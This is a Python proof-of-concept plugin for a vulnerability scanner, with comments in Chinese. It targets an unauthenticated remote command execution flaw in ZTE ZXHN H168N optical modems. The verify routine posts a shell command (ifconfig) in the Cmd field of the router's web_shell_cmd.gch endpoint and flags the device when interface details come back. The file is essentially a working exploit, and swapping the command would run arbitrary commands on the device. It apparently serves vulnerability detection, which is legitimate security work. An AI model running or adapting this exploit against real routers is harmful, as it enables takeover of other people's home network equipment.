# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urlparse


class Vuln(ABVuln):
    vuln_id = 'ZTE_0003'  # 平台漏洞编号，留空
    name = '中兴ZXHN H168N光猫 任意远程命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-03-27'  # 漏洞公布时间
    desc = '''
        中兴ZXHN H168N光猫任意远程命令执行：web_shell_cmd.gch
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ZTE'  # 漏洞应用名称
    product_version = '中兴ZXHN H168N光猫'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c0e82fdf-0d61-401b-a2b9-a688c896bd2b'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2015-0104095
            hh = hackhttp.hackhttp()
            arg = self.target
            postdata = 'IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=ifconfig&CmdAck='
            target = arg + '/web_shell_cmd.gch'
            code, head, res, errcode, _ = hh.http(target, post=postdata)

            if code == 200 and 'encap:Ethernet' in res and 'HWaddr' in res:
                #security_hole('ZTE Router Arbitrary command execution'+target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
